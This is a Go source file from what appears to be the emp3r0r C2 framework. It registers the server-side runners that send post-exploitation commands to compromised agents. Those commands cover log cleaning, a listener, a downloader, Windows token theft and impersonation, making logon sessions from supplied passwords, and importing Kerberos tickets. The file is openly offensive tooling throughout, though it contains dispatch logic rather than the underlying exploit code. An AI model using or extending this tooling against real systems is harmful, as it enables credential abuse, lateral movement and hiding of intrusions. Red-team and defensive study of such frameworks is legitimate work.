package modules

import (
	"fmt"
	"sort"
	"strconv"
	"strings"
	"sync"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

var (
	moduleRunnersMu          sync.RWMutex
	autoRegisterBuiltInsOnce sync.Once
)

type builtInGoModuleMeta struct {
	C2Cmd   string
	Special bool
}

var builtInGoModules = map[string]builtInGoModuleMeta{
	def.ModCLEAN_LOG: {C2Cmd: def.C2CmdCleanLog},

	def.ModListener:   {C2Cmd: def.C2CmdListener},
	def.ModDownloader: {C2Cmd: def.C2CmdFileDownloader},

	// steal_token and list_tokens use dedicated runners
	def.ModStealToken: {C2Cmd: def.C2CmdStealToken, Special: true},
	def.ModListTokens: {C2Cmd: def.C2CmdListTokens, Special: true},

	// make_token / list_sessions / import_ticket use dedicated runners
	def.ModMakeToken:    {C2Cmd: def.C2CmdMakeToken, Special: true},
	def.ModListSessions: {C2Cmd: def.C2CmdListSessions, Special: true},
	def.ModImportTicket: {C2Cmd: def.C2CmdImportTicket, Special: true},
}

func ensureBuiltInGoModuleRunners() {
	autoRegisterBuiltInsOnce.Do(func() {
		if !hasModuleRunner(def.ModStealToken) {
			registerModuleRunner(def.ModStealToken, runStealToken)
		}
		if !hasModuleRunner(def.ModListTokens) {
			registerModuleRunner(def.ModListTokens, runListTokens)
		}
		if !hasModuleRunner(def.ModMakeToken) {
			registerModuleRunner(def.ModMakeToken, runMakeToken)
		}
		if !hasModuleRunner(def.ModListSessions) {
			registerModuleRunner(def.ModListSessions, runListSessions)
		}
		if !hasModuleRunner(def.ModImportTicket) {
			registerModuleRunner(def.ModImportTicket, runImportTicket)
		}

		def.Modules.Range(func(key, value any) bool {
			name := key.(string)
			meta, ok := builtInGoModules[name]
			if !ok || meta.Special {
				return true
			}
			if hasModuleRunner(name) {
				return true
			}

			mod := value.(*def.ModuleConfig)
			if strings.ToLower(mod.AgentConfig.Exec) != "built-in" || strings.ToLower(mod.AgentConfig.Type) != "go" {
				return true
			}
			if meta.C2Cmd == "" {
				return true
			}

			registerModuleRunner(name, makeAutoBuiltInRunner(name))
			return true
		})
	})
}

func makeAutoBuiltInRunner(modName string) func(ctx *c2context.C2Context) {
	return func(ctx *c2context.C2Context) {
		err := runAutoBuiltInModule(ctx, modName)
		if err != nil {
			logging.Errorf("%v", err)
		}
	}
}

func runAutoBuiltInModule(ctx *c2context.C2Context, modName string) error {
	if ctx.Target == nil {
		return fmt.Errorf("no active agent")
	}

	val, ok := def.Modules.Load(modName)
	if !ok {
		return fmt.Errorf("module %s config not found", modName)
	}
	mod := val.(*def.ModuleConfig)

	meta, ok := builtInGoModules[modName]
	if !ok {
		return fmt.Errorf("module %s has no metadata", modName)
	}
	if meta.Special {
		return fmt.Errorf("module %s is handled by a dedicated C2 runner", modName)
	}
	if meta.C2Cmd == "" {
		return fmt.Errorf("module %s has no mapped C2 command", modName)
	}

	flagVals := make(map[string]string, len(mod.Options))
	for name, opt := range mod.Options {
		if runtimeVal, ok := ctx.Flags[name]; ok {
			flagVals[name] = runtimeVal
			continue
		}
		if opt != nil {
			flagVals[name] = opt.Val
		}
	}

	keys := make([]string, 0, len(flagVals))
	for k := range flagVals {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	parts := []string{meta.C2Cmd}
	for _, key := range keys {
		val := strings.TrimSpace(flagVals[key])
		if val == "" {
			continue
		}

		// Legacy semantics: stop=yes should emit a standalone boolean flag.
		if key == "stop" && strings.EqualFold(val, "yes") {
			parts = append(parts, "--stop")
			continue
		}
		if key == "stop" && strings.EqualFold(val, "no") {
			continue
		}

		parts = append(parts, "--"+key, strconv.Quote(val))
	}

	cmd := strings.Join(parts, " ")
	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
		return fmt.Errorf("SendCmd: %w", err)
	}

	if modName == def.ModListener {
		action := flagVals["action"]
		if action == "" {
			action = "start"
		}
		logging.Infof("Listener %s requested on %s", action, ctx.Target.Tag)
	}
	return nil
}

func registerModuleRunner(name string, runner func(ctx *c2context.C2Context)) {
	moduleRunnersMu.Lock()
	defer moduleRunnersMu.Unlock()
	ModuleRunners[name] = runner
}

func deleteModuleRunner(name string) {
	moduleRunnersMu.Lock()
	defer moduleRunnersMu.Unlock()
	delete(ModuleRunners, name)
}

func getModuleRunner(name string) func(ctx *c2context.C2Context) {
	moduleRunnersMu.RLock()
	defer moduleRunnersMu.RUnlock()
	return ModuleRunners[name]
}

func hasModuleRunner(name string) bool {
	moduleRunnersMu.RLock()
	defer moduleRunnersMu.RUnlock()
	_, ok := ModuleRunners[name]
	return ok
}

// runStealToken is the dedicated runner for the steal_token built-in module.
// It reads the "pid" flag from ctx.Flags, sends the !steal_token --pid <pid>
// command to the target agent, and logs a reminder about using the resulting
// SID in the "token" option of other modules.
//
// If the "token" flag is set, it is forwarded as --token <sid> so the agent
// can impersonate the existing token before opening the target process.
func runStealToken(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("steal_token: no active agent")
		return
	}

	pid, ok := ctx.Flags["pid"]
	if !ok || strings.TrimSpace(pid) == "" {
		logging.Errorf("steal_token: 'pid' flag is required – pass it with: steal_token --pid <PID>")
		return
	}

	tokenSID := strings.TrimSpace(ctx.Flags["token"])

	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdStealToken, strconv.Quote(strings.TrimSpace(pid)))
	if tokenSID != "" {
		cmd += fmt.Sprintf(" --token %s", strconv.Quote(tokenSID))
	}
	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
		logging.Errorf("steal_token: sending command: %v", err)
		return
	}

	if tokenSID != "" {
		logging.Infof("steal_token: sent to %s (pid=%s, token=%s) – on success the agent will report the SID; use that SID as the 'token' option in other modules", ctx.Target.Tag, pid, tokenSID)
	} else {
		logging.Infof("steal_token: sent to %s (pid=%s) – on success the agent will report the SID; use that SID as the 'token' option in other modules", ctx.Target.Tag, pid)
	}
}

// runListTokens sends !list_tokens to the target agent to dump all cached
// impersonation tokens with their friendly names.
func runListTokens(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("list_tokens: no active agent")
		return
	}
	if err := CmdSender(def.C2CmdListTokens, "", ctx.Target.Tag); err != nil {
		logging.Errorf("list_tokens: sending command: %v", err)
	}
}

// runMakeToken is the dedicated runner for the make_token built-in module.
// It sends !make_token --user <user> [--domain <domain>] [--password <pwd>]
// [--name <session>] to the target agent and logs a reminder about running
// BOFs/starlark modules under the new session via the "token" option and
// importing tickets with import_ticket.
func runMakeToken(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("make_token: no active agent")
		return
	}

	user := strings.TrimSpace(ctx.Flags["user"])
	if user == "" {
		logging.Errorf("make_token: 'user' flag is required – pass it with: make_token --user <USER> [--domain <DOMAIN>]")
		return
	}

	parts := []string{def.C2CmdMakeToken, "--user", strconv.Quote(user)}
	for _, f := range []string{"domain", "password", "name"} {
		if v := strings.TrimSpace(ctx.Flags[f]); v != "" {
			parts = append(parts, "--"+f, strconv.Quote(v))
		}
	}
	cmd := strings.Join(parts, " ")
	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
		logging.Errorf("make_token: sending command: %v", err)
		return
	}

	sessionName := strings.TrimSpace(ctx.Flags["name"])
	if sessionName == "" {
		sessionName = user
	}
	logging.Infof("make_token: sent to %s (user=%s) – on success run BOF/starlark modules with --token %q and import tickets with: import_ticket --session %q --ticket <base64>",
		ctx.Target.Tag, user, sessionName, sessionName)
}

// runListSessions sends !list_sessions to the target agent to dump all
// make_token netlogon logon sessions.
func runListSessions(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("list_sessions: no active agent")
		return
	}
	if err := CmdSender(def.C2CmdListSessions, "", ctx.Target.Tag); err != nil {
		logging.Errorf("list_sessions: sending command: %v", err)
	}
}

// runImportTicket is the dedicated runner for the import_ticket built-in
// module. It sends !import_ticket --session <name>|--luid <hex> --ticket <b64>
// to the target agent.
func runImportTicket(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("import_ticket: no active agent")
		return
	}

	ticket := strings.TrimSpace(ctx.Flags["ticket"])
	if ticket == "" {
		logging.Errorf("import_ticket: 'ticket' flag is required – pass it with: import_ticket --session <NAME> --ticket <BASE64>")
		return
	}

	session := strings.TrimSpace(ctx.Flags["session"])
	luid := strings.TrimSpace(ctx.Flags["luid"])
	if session == "" && luid == "" {
		logging.Errorf("import_ticket: specify --session <NAME> or --luid <HEX> together with --ticket <BASE64>")
		return
	}

	parts := []string{def.C2CmdImportTicket, "--ticket", strconv.Quote(ticket)}
	if session != "" {
		parts = append(parts, "--session", strconv.Quote(session))
	}
	if luid != "" {
		parts = append(parts, "--luid", strconv.Quote(luid))
	}
	cmd := strings.Join(parts, " ")
	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
		logging.Errorf("import_ticket: sending command: %v", err)
	}
}
